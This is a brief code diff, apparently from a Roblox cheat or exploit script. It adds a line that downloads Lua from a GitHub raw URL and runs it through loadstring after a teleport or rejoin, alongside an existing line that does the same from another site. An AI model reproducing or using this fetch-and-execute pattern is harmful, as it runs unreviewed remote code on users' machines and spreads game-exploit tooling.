@@ -20,6 +20,7 @@ end
 -- Define the code to execute after teleport
 local teleportCode = [[
     loadstring(game:HttpGet("https://scripts.alchemyhub.xyz"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/MysticCr1/RobloxScripts/refs/heads/scripts/script.lua"))()
 ]]
 
 -- Function to rejoin the game
